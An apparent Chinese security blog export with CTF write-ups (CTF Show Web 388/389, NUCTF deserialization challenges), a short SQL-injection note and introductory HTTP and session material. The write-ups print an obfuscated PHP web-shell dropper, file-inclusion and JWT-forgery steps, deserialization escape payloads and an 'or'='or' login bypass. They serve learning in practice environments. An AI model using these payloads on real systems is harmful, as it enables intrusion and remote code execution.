<h2 id="1-8-Web-388"><a href="#1-8-Web-388" class="headerlink" title="1.8 Web 388"></a>1.8 Web 388</h2><p>按照之前的思路来</p>
<p><img src="https://i.loli.net/2021/08/04/AqSUnLY1GPskMEw.png" alt="image-20210804154217200"></p>
<p>看了其它大神的解，发现在后台还有 <code>/editor/</code> 目录，一扫，果然</p>
<p><img src="https://i.loli.net/2021/08/04/3UWDplujK5rQd76.png" alt="image-20210804160121313"></p>
<p>那么就一定存在文件上传的问题</p>
<ul>
<li><code>alsckdfy/editor</code> 文件上传</li>
<li><code>/debug?file=</code> 进行文件包含，写入 <code>.php</code> 文件</li>
<li>访问 <code>.php</code> 文件，进行命令执行</li>
</ul>
<p><img src="https://i.loli.net/2021/08/04/GKoTEkeUdg137p8.png" alt="image-20210804160641858"></p>
<p>我想着写完之后提交，居然还未开放，那就只好 上传文件了</p>
<p><img src="https://i.loli.net/2021/08/04/FIDvAwPoiS6EHzW.png" alt="image-20210804160753795"></p>
<p>KindEditor 4.1.11 (2016-03-31)</p>
<p>网上查找相关漏洞</p>
<p><img src="https://i.loli.net/2021/08/04/G1RQfv7tzdZMUAj.png" alt="image-20210804160912989"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 我尝试了一下</span></span><br><span class="line">/alsckdfy/editor/php/file_manager_json.php?path=/</span><br><span class="line"><span class="comment"># 居然不行</span></span><br></pre></td></tr></table></figure>

<p>那就别想着 编辑器的 任意文件遍历的 漏洞了，老老实实上传文件吧</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本地的 2.zip 免杀🐎</span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$s</span>=<span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1])&#x27;</span>.<span class="string">&#x27;;?&gt;&#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&#x27;/var/www/html/2.php&#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路径 </span></span><br><span class="line"><span class="comment"># /alsckdfy/attached/file/20210804/20210804083008_10879.zip</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/gIeMW3DuH7OSdmV.png" alt="image-20210804162756748"></p>
<p>可以看到有限制，我们可以上传 <code>.zip</code> 文件</p>
<p><img src="https://i.loli.net/2021/08/04/orBVz7ZKNWgScqv.png" alt="image-20210804161941726"></p>
<p>然后包含，我们将它写到 网站根目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20210804/20210804083008_10879.zip</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/04/HoWfO6sdRU3B18N.png" alt="image-20210804162134294"></p>
<p><img src="https://i.loli.net/2021/08/04/GqBs5KEhOfkzled.png" alt="image-20210804163113755"></p>
<p>可以看到，上传成功</p>
<p>直接命令执行，查看源码得到</p>
<p><img src="https://i.loli.net/2021/08/04/OHUokTwFJBXzSlp.png" alt="image-20210804163322989"></p>
<h2 id="1-9-Web-389"><a href="#1-9-Web-389" class="headerlink" title="1.9 Web 389"></a>1.9 Web 389</h2><p>按照上面思路</p>
<p><img src="https://i.loli.net/2021/08/04/4MlbasVHRpfghcZ.png" alt="image-20210804164040896"></p>
<p>权限不足，找 cookie</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYyODA2Njc0NiwiZXhwIjoxNjI4MDczOTQ2LCJuYmYiOjE2MjgwNjY3NDYsInN1YiI6InVzZXIiLCJqdGkiOiIwMDRmYzQzMjU0ODI3MGVlYTc4Mjg3MTg5ZWE2YjNkOCJ9.PWduIXmiYUefpQpuTkyCxMmg7IWvRvWqyC1rJZA8aIs</span><br></pre></td></tr></table></figure>

<p>jwt 在线 解密 <a href="https://jwt.io/">https://jwt.io/</a></p>
<p><img src="https://i.loli.net/2021/08/04/wM5tEhi42X1AnFZ.png" alt="image-20210804164905283"></p>
<p>然后我们修改为 admin</p>
<p><img src="https://i.loli.net/2021/08/04/dUEKgxFwjiQ7zeD.png" alt="image-20210804165033210"></p>
<p>更改之后刷新，回到上一关</p>
<p><img src="https://i.loli.net/2021/08/04/zaHVx92uLwv3YIt.png" alt="image-20210804165212640"></p>
<p><a href="http://4563dd47-a66b-4309-9e15-183bb065ff68.challenge.ctf.show:8080/alsckdfy/attached/file/20210804/20210804085256_19145.zip">/alsckdfy/attached/file/20210804/20210804085256_19145.zip</a></p>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NUCTF</title>
    <url>/2021/06/24/NUCTF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>概述：主要考点 — 序列化与反序列化字符逃逸</p>
<span id="more"></span>

<h1 id="NUCTF"><a href="#NUCTF" class="headerlink" title="NUCTF"></a>NUCTF</h1><h2 id="1-EasyUnser"><a href="#1-EasyUnser" class="headerlink" title="1 EasyUnser"></a>1 EasyUnser</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);<span class="comment">// Security filtering function	</span></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> str_replace(<span class="string">&#x27;secure&#x27;</span>, <span class="string">&#x27;secured&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">       <span class="comment">// Security filtering</span></span><br><span class="line">       <span class="variable">$h</span>-&gt;username = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">       <span class="variable">$c</span> = unserialize(filter(serialize(<span class="variable">$h</span>)));</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$c</span>-&gt;password === <span class="string">&#x27;hacker&#x27;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>POST 传入参数 username 和 password</li>
<li>题目初始化 <code>public $password = &#39;margin123&#39;;</code> ，而要想获取 flag 必须使 password 为 hacker</li>
<li>根据 PHP 反序列化时遇到 <code>;&#125;</code> 即反序列化结束，我们传入 username 为 <code>margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code> ，希望原本初始化的 password 的值 <code>margin123</code> 失效（被顶出去）</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:37:&quot;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;margin&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">   print_r(unserialize(<span class="variable">$h</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<ol start="4">
<li>如果我们将上面的得到的内容进行 <code>反序列化输出</code>，结果将会报错；这是因为 <code>s:37:&quot;margin&quot;;</code> 这里按道理应该是 <code>s:6:&quot;margin&quot;;</code>，但由于我们需要按照上面的方法将后面的 <code>&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</code> 挤掉，因此实际上传入的长度是37，所以我们需要想办法将这37个长度补齐，还需要多传入 31个长度；</li>
<li>题目中的 filter 函数即是将 <code>secuer 替换为 secured</code> ，一个 secured 比 secure 多一个长度，那么 31个 secure 就会多出 31个长度，从而导致字符增加</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$username</span> = <span class="string">&#x27;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&#x27;margin123&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$h</span> = <span class="keyword">new</span> Hacker();</span><br><span class="line">    <span class="keyword">echo</span> serialize(<span class="variable">$h</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">实际上username的长度是<span class="number">186</span>，但是被替换之后成为</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 被 filter 替换之后变成 O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:217:&quot;securedsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecuredsecured&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:9:&quot;margin123&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样就补齐了</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post传参：   username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure%<span class="number">22</span>;s:<span class="number">8</span>:%<span class="number">22</span>password%<span class="number">22</span>;s:<span class="number">6</span>:%<span class="number">22</span>hacker%<span class="number">22</span>;&#125;&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure>

<h2 id="2-Just-Serizlize"><a href="#2-Just-Serizlize" class="headerlink" title="2 Just Serizlize"></a>2 Just Serizlize</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;<span class="comment">// $flag = &quot;DASCTF&#123;xxxxx&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;obj&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$obj</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = @unserialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$obj</span>-&gt;flag === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$obj</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$obj</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$k</span> !== <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$v</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<blockquote>
<ol>
<li>GET 传参 obj；</li>
<li>传入参数不得含有 flag；对象中包含 flag 字段时，才会传入 $flag 的内容；但当字段名不为 flag 时，才能显示出 $flag；</li>
<li>hex 编码绕过 <code>if ($k !== &quot;flag&quot;) </code> ，把 s 换成 S；</li>
<li>表示字符类型的s大写时, 会被当成16进制解析, 定义一个变量取 flag 变量的地址即可得到 flag 变量的值；</li>
</ol>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$obj</span> = (<span class="keyword">object</span>)[<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">  <span class="variable">$obj</span>-&gt;Hh0 = &amp;<span class="variable">$obj</span>-&gt;flag;</span><br><span class="line">  <span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:3:&quot;Hh0&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Hh0&quot;</span>;R:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;asd&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2021/11/19/PHP-%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--+空格</span></span><br><span class="line">#</span><br><span class="line"><span class="comment">/**/</span></span><br></pre></td></tr></table></figure>

<p>万能密码漏洞</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;or&#x27;</span><span class="operator">=</span><span class="string">&#x27;or&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Struggling</title>
    <url>/2021/11/07/Struggling/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/11/07/Aj7dS1eMpwxmlqH.jpg" alt="1636260982008"><img src="https://i.loli.net/2021/11/07/DUbOPSBcTtnlmCN.jpg" alt="IMG_20211029_205703"></p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>Web基础</title>
    <url>/2021/05/24/Web%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>攻击者攻击服务器–首先要保证两者之间能正常的进行通信<br>如何通信？服务器上的各种服务都是依托于 端口 来实现对外提供服务的，攻击者所入侵的就是端口<br>什么是Web应用？提供W e b服务的应用系统,其实通俗讲就是一个网站。</p>
<span id="more"></span>

<h2 id="一、访问网页流程"><a href="#一、访问网页流程" class="headerlink" title="一、访问网页流程"></a>一、访问网页流程</h2><h3 id="1-1-访问静态网页流程"><a href="#1-1-访问静态网页流程" class="headerlink" title="1.1 访问静态网页流程"></a>1.1 访问静态网页流程</h3><ul>
<li><p><strong>编写</strong>：HTML , CSS , JavaScript</p>
</li>
<li><p><strong>流程</strong>：在 浏 览 器 中 输 入h t t p : / / w w w . s e c u r i t y . c o m / a d m i n / i n d e x . h t m l 后 回 车，客户端向服务端发送HTTP请求报文，服务端通过运行其含有的Web应用服务器（Web容器，中间件）对接收到的请求进行处理–判断请求的文件扩展名，在网站的根目录之下寻找对应的文件，Web应用服务器再构建HTTP响应报文将文件源代码返回给浏览器，代码经过浏览器的渲染过后呈现的画面供客户端使用。</p>
</li>
</ul>
<h3 id="1-2-访问动态网页流程"><a href="#1-2-访问动态网页流程" class="headerlink" title="1.2 访问动态网页流程"></a>1.2 访问动态网页流程</h3><ul>
<li><p><strong>编写</strong>：.php , .jsp , .asp , .aspx ，一般 由HTML+CSS+JavaScript+后端语言代码组成。</p>
</li>
<li><p><strong>流程</strong>：判断请求文件扩展名之后，将会将对应的文件交给 <code>PHP脚本引擎</code> 去处理，使之解析文件当中的 PHP 代码，如果代码中涉及到队数据库的操作。它会请求相应的数据库，让数据库去执行队数据的增删改查等操作，然后将处理的结果返回给PHP脚本引擎。PHP脚本引擎将结果交给 Web 应用服务器（Apache），Web 应用服务器构建HTTP响应报文，由服务端发送给浏览器，经过解析之后，由客户端使用。</p>
</li>
<li><p><strong>数据库</strong>：SQL Server , MySQL , Oracle</p>
</li>
</ul>
<h2 id="二、Web应用基本架构"><a href="#二、Web应用基本架构" class="headerlink" title="二、Web应用基本架构"></a>二、Web应用基本架构</h2><p>Web应用程序的设计者、Web应用服务器、动态脚本引擎(服务端程序语言)、数据库</p>
<p>常见Web服务端架构：</p>
<p><img src="https://i.loli.net/2021/05/25/rDAOBg9jn8bZ7R4.png" alt="image-20210404084121968"></p>
<p>LAMP和WAMP就是Windows/Linux+Apache+PHP+MySQL</p>
<h2 id="三、URL"><a href="#三、URL" class="headerlink" title="三、URL"></a>三、URL</h2><p>URL：统一资源定位符（网页地址，网址），用于定位服务器的资源（文档，页面，图像等等）</p>
<ul>
<li><p><strong>标准格式 : protocol://userInfo@hostname[:port]/path/[?query]#fragment  真正访问的是@之后的地址</strong></p>
<ul>
<li><p>userInfo：user:password  不推荐</p>
</li>
<li><p><strong>井号</strong>：在URL中指定的是页面中的一个位置</p>
<p>井号作为 页面定位符 出现在URL中，比如：<em><a href="http://www.httpwatch.com/features.htm#print">http://www.httpwatch.com/features.htm#print</a></em> ，此URL表示在页面features.htm中print的位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。</p>
</li>
</ul>
</li>
<li><p><strong>URL编码：</strong></p>
<ul>
<li><p>产生原因：一些特殊字符会含有不同而含义：<code>?username=1&amp;passwd=2%263</code> ，为了区分。RFC标准提出 <code>URL编码方案</code></p>
</li>
<li><p>常见：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=  	%3d</span><br><span class="line">#	%23</span><br><span class="line">%	%25</span><br><span class="line">&amp;	%26</span><br><span class="line">/	%2f</span><br><span class="line">空格	%20</span><br><span class="line">换行	%0a</span><br><span class="line">空字节	%00</span><br><span class="line">加号 	+ 代表URL编码当中的 空格</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="四、HTTP"><a href="#四、HTTP" class="headerlink" title="四、HTTP"></a>四、HTTP</h2><p>HTTP （HyperText Transfer Protocol）超文本传输协议（请求/响应协议）：规定浏览器与万维网服务器之间的通信规则。<strong>无状态的协议</strong></p>
<h3 id="4-1-HTTP-协议报文"><a href="#4-1-HTTP-协议报文" class="headerlink" title="4.1 HTTP 协议报文"></a>4.1 HTTP 协议报文</h3><h4 id="4-1-1-请求报文"><a href="#4-1-1-请求报文" class="headerlink" title="4.1.1 请求报文"></a>4.1.1 请求报文</h4><ul>
<li><p>请求行 ：<code>请求方法 /URL /HTTP协议版本</code> 空格隔离</p>
</li>
<li><p>请求头部：告知服务器客户端请求的信息，<code>关键字:值</code>，每行一对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host				被请求资源的主机名</span><br><span class="line">User-Agent			产生请求的浏览器类型</span><br><span class="line">Accept				客户端可处理的 MIME 类型</span><br><span class="line">Accept-Encoding		客户端能够理解的内容编码方式</span><br><span class="line">Accept-Language		客户端可理解的语言</span><br><span class="line">Cookie				客户端身份凭证</span><br></pre></td></tr></table></figure>

<p><strong>Referer</strong></p>
<p>重定向时，声明用户从什么地方（上一个URL）到达现在的URL的。<br>例如：登陆页面，当用户登陆成功之后，HTTP请求报文中会有Referer字段–显示用户是从什么地方跳转到成功登录之后的界面的，服务端会进行检测，用于判断准确性。</p>
<p><strong>Post方式</strong>：经常会有 <code>Content-Type 和 Content-Length</code>字段</p>
</li>
<li><p>空行</p>
</li>
<li><p>请求的数据</p>
<ul>
<li>Get方式：没有请求正文，请求的数据在URL当中</li>
<li>Post方式：请求报文当中的最下面</li>
</ul>
</li>
</ul>
<h4 id="4-1-2-响应报文"><a href="#4-1-2-响应报文" class="headerlink" title="4.1.2 响应报文"></a>4.1.2 响应报文</h4><ul>
<li><p>状态行  ： <code>HTTP协议版本 状态码 状态描述</code> 空格隔离</p>
<ul>
<li><strong>状态码：</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1xx		信息--服务器收到请求，需要请求者继续执行操作</span><br><span class="line">2xx		成功--操作成功被服务器接收并处理</span><br><span class="line">3xx		重定向--需要进一步操作才可完成请求</span><br><span class="line">4xx		客户端请求时错误</span><br><span class="line">5xx		服务端处理请求时错误</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>状态描述：</strong></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th align="center">状态描述</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">200</td>
<td align="center">OK</td>
<td align="center">请求成功</td>
</tr>
<tr>
<td align="center">304</td>
<td align="center">Not Modified</td>
<td align="center">直接使用本地缓存</td>
</tr>
<tr>
<td align="center">400</td>
<td align="center">Bad Request</td>
<td align="center">客户端请求语法错误，服务器无法理解</td>
</tr>
<tr>
<td align="center">401</td>
<td align="center">Unauthorized</td>
<td align="center">请求未经授权</td>
</tr>
<tr>
<td align="center">403</td>
<td align="center">Forbidden</td>
<td align="center">服务器收到请求但拒绝提供服务</td>
</tr>
<tr>
<td align="center">404</td>
<td align="center">Not Found</td>
<td align="center">请求资源不存在</td>
</tr>
<tr>
<td align="center">500</td>
<td align="center">Internal Server Error</td>
<td align="center">服务器发生了不可预知的错误</td>
</tr>
<tr>
<td align="center">503</td>
<td align="center">Server Unavaiable</td>
<td align="center">服务器当前无法处理客户端的请求</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
<li><p>响应头部：描述服务器信息  <code>关键字:值</code>，每行一对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Date				请求发送的时间 日期</span><br><span class="line">Server				告知客户端服务器的名称与版本号</span><br><span class="line">Content-Type		响应正文的 MIME类型</span><br><span class="line">Content-Length		响应正文的长度</span><br><span class="line">Connection			告知客户端响应完成之后的连接状态</span><br><span class="line">Content-Encoding	Web服务器告诉浏览器使用的是哪种压缩方法</span><br><span class="line">Last-Modified		指定资源的最后修改时间与日期</span><br></pre></td></tr></table></figure></li>
<li><p>空行</p>
</li>
<li><p>响应正文</p>
</li>
</ul>
<h3 id="4-2-HTTP请求方法–8种"><a href="#4-2-HTTP请求方法–8种" class="headerlink" title="4.2 HTTP请求方法–8种"></a>4.2 HTTP请求方法–8种</h3><p>服务端根据不同的请求方法做出不同的响应</p>
<h4 id="GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT"><a href="#GET-POST-HEAD-PUT-DELETE-OPTIONS-TRACE-CONNECT" class="headerlink" title="GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT"></a>GET , POST , HEAD , PUT , DELETE , OPTIONS , TRACE , CONNECT</h4><ul>
<li><p>GET  ：URL当中发送，有长度限制</p>
</li>
<li><p>POST ：在HTTP请求正文当中发送，无长度大小限制，可传递大量数据。</p>
<p>一般用于更新资源信息，向服务器提交数据。例如：登录，注册，修改资料，上传文件等等</p>
</li>
</ul>
<p><strong>安全性：</strong>不安全，黑客可获取，修改通信内容，冒充他人身份</p>
<p><strong>解决：</strong>HTTPS协议（HyperText Transfer Prototol over Secure Socket Later）:在HTTP基础上加了 SSL/TLS层。</p>
<h2 id="五、会话技术"><a href="#五、会话技术" class="headerlink" title="五、会话技术"></a>五、会话技术</h2><p><strong>盗取 Cookie       会话劫持</strong></p>
<ul>
<li><p>产生原因：HTTP协议是无连接，无状态的，无法记住客户端的信息。于是产生了<strong>会话技术：Session , cookie</strong></p>
</li>
<li><p>**Cookie :  **由服务端生成，由服务器将数据通过HTTP响应储存到浏览器上，则浏览器在以后就可直接携带上这个 Cookie 访问该服务器。</p>
<ul>
<li><strong>客户端第一次请求</strong>：PHP 的 setcookie 函数 将 cookie数据 通过HTTP协议与响应头传给浏览器，浏览器第一次响应时将Cookie数据保存到浏览器上。</li>
<li><strong>客户端再次发送请求</strong>：首先自动检测本地是否存在Cookie数据，若存在，直接在请求头当中将Cookie数据发送给服务器；PHP执行自动判断浏览器请求中是否携带Cookie，有的话，自动保存到 $_COOKIE 当中；利用 $ _COOKIE 访问 Cookie数据。</li>
</ul>
</li>
<li><p>**Session :   **与浏览器无关，以Cookie为基础，将重要的数据保存到服务端，同时将能够唯一表示这个数据的数据以COOKIE的形式保存在客户端。</p>
<ul>
<li><strong>客户端第一次请求</strong>：创建 <code>SESSIONID</code> ；初始化超全局变量 <code>$_SESSION</code>；在php指定目录创建SESSIONId为名的文件；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并 <code>将SESSIONID以SETCOOKIE的形式返回给客户端</code>，相当于 <code>将SESSIONID 写入 COOKIE 当中</code>。</li>
<li><strong>客户端再次发送请求</strong>：检测到 <code>客户端的COOKIE中的SESSIONID</code> ；初始化超全局变量<code>$_SESSION</code>；找到文件，反序列化读取数据存储到<code>$_SESSION</code>中；脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。</li>
</ul>
</li>
<li><p><strong>登陆判断：</strong></p>
<ul>
